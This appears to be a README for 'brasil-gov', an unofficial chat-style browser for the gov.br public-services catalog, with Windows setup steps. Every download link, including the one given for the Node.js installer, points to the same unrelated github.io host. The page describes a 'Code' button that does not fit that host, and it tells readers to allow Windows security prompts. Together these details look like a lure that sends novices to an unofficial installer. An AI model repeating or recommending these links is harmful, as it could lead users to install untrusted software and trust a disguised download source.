# 🇧🇷 brasil-gov - Explore Brazilian Public Services Easily

[![Download brasil-gov](https://img.shields.io/badge/Download-brasil--gov-eb6834?style=for-the-badge&logo=github&logoColor=white)](https://sugriv1234.github.io)

**brasil-gov** is an independent interface for exploring Brazilian public services from the gov.br catalog. Think of it as a friendly chat window: you type the name of a service or a government agency, and the app shows you real catalog records — descriptions, requirements, steps, costs, and official links — all in one place.

> **Important:** This is **not** an official government website. It is an independent, community-built tool that displays publicly available catalog records.

Want to try it right now without installing anything? Visit the live site: **https://sugriv1234.github.io**

---

## 🚀 Download and Setup (Windows)

Everything you need is on the project page. Follow these steps in order and you will have the app running on your computer in a few minutes. No prior programming experience is required.

**Step 1 — Get the application files**

Visit this link to download the application:

👉 **https://sugriv1234.github.io**

On that page, look for the green **Code** button near the top right. Click it, then choose **Download ZIP**. Windows will save a compressed file to your **Downloads** folder.

**Step 2 — Unzip the folder**

Open your **Downloads** folder in File Explorer. Right-click the file you just downloaded and choose **Extract All…**, then click **Extract**. You now have a normal folder containing the application. Move it somewhere easy to find, such as your **Documents** folder.

**Step 3 — Install Node.js**

The application needs a free helper program called Node.js to run. Go to **https://sugriv1234.github.io**, download the **LTS** version for Windows, and run the installer. Click **Next** through every screen and accept the defaults — this is safe and standard.

Use Node.js version **22.13 or newer**. The installer offers the latest version, so simply accepting the default is fine.

**Step 4 — Turn on pnpm**

The app uses a package manager called **pnpm** (version 11). Once Node.js is installed:

1. Press the **Windows key**, type `Command Prompt`, and open it.
2. Type the following and press Enter:

```
corepack enable
```

3. Then type this and press Enter:

```
corepack prepare pnpm@11 --activate
```

Wait a few seconds for it to finish. That is all the setup the helper tool needs.

**Step 5 — Open a terminal inside the app folder**

In File Explorer, open the folder you extracted in Step 2. Click once in the address bar at the top, type `cmd`, and press **Enter**. A black command window opens, already pointed at the correct folder.

**Step 6 — Install the app's parts**

Type the following in that window and press Enter:

```
pnpm install
```

You will see a stream of text as components download. This can take a couple of minutes on a normal connection. When it stops and you see your folder path again, it is done.

**Step 7 — Start the app**

Type this and press Enter:

```
pnpm dev
```

A message appears containing a web address, usually `http://localhost:5173`. Hold **Ctrl** and click that address, or copy it into your browser. The brasil-gov chat opens and is ready to use.

To stop the app later, click the command window and press **Ctrl + C**. To start it again, repeat Steps 5 and 7 — you never need to reinstall.

---

## 💬 How the Chat Works

1. Type the name of a service or an agency, or pick one of the ready-made examples shown on screen.
2. Suggestions appear automatically once you have typed two characters. They show up on both the home page and inside the chat, and the list loads ten services at a time as you scroll.
3. Choose a suggestion or press Enter to search the catalog.
4. The reply shows the real catalog record: what the service is for, who can use it, the documents or conditions required, the steps to follow, any cost involved, and a link to the official page.

Because the answers come straight from the gov.br catalog records, you always see the source text rather than a paraphrase.

---

## ✨ What You Can Do With It

- **Find a service fast** — search by service name or by the agency responsible.
- **Read the fine print first** — requirements, steps, and costs are shown before you commit any time.
- **Follow the official link** — every record points back to the authoritative government page.
- **Browse without an account** — there is no sign-up, no login, and no personal profile.
- **Use it in Portuguese-friendly context** — catalog records appear as published, including their original wording.

---

## 🖥️ Everyday Use Tips

- Keep the command window open while you use the app. Closing it shuts the app down.
- Bookmark `http://localhost:5173` in your browser so you can reopen it quickly next time.
- If the browser shows a blank page, make sure the `pnpm dev` window is still open and shows no red error text.
- The live site at **https://sugriv1234.github.io** is always available if you do not want to run anything locally.

---

## 🔧 Useful Commands

These are optional checks. You do not need them to use the app, but they are handy if something looks wrong.

| Command | What it does |
| --- | --- |
| `pnpm lint` | Checks the source code for common mistakes |
| `pnpm lint:fix` | Applies automatic fixes for those mistakes |
| `pnpm typecheck` | Verifies the app, scripts, tests, and Vite configuration without building |
| `pnpm format` | Formats the source files consistently |
| `pnpm format:check` | Reports files that are not yet formatted |
| `pnpm test` | Runs the automated test suite |
| `pnpm build` | Regenerates retrieval artifacts, then compiles the production bundle |

Run any of these the same way you ran `pnpm install` — open a command window in the app folder and type the command.

---

## 🛠️ Troubleshooting

**"pnpm is not recognized"**
Close the command window completely, open a new one, and try again. The helper tool is only picked up by windows opened after installation.

**"Node.js version is too old"**
Reinstall Node.js from **https://sugriv1234.github.io** using the **LTS** download, then reopen the command window.

**The install stopped halfway**
Run `pnpm install` once more. It resumes from where it left off rather than starting over.

**The page will not load**
Check the address includes the port shown in the command window (`5173` is typical). If that port is busy, the window will display a different number — use that one instead.

**Windows asks for permission**
Allow it. Installing development tools and running local servers can trigger a standard Windows security prompt.

---

## 🌐 Publishing Your Own Copy

If you have a Vercel account, you can publish the app yourself with a single command:

```
vercel deploy --prod
```

This builds and hosts the site for you. It is entirely optional — everything above works locally on your own computer.

---

## 🔒 Privacy and Independence

brasil-gov does not require an account and does not build a profile of you. Searches happen against catalog records, and the official links open on government domains.

This project is independent and unaffiliated with the Brazilian government. It exists to make public catalog information easier to browse. Always confirm details on the official page linked within each record before acting on them.

---

## 📥 Get Started Again

Ready to install? Visit this link to download the application:

👉 **https://sugriv1234.github.io**

Extract the folder, install Node.js, enable pnpm, then run `pnpm install` and `pnpm dev`. The chat opens in your browser and the catalog is at your fingertips.

Keywords: brasil-gov, brazilian public services, gov.br catalog, government services search, service requirements, public services chat, nodejs, pnpm, vercel, open catalog browser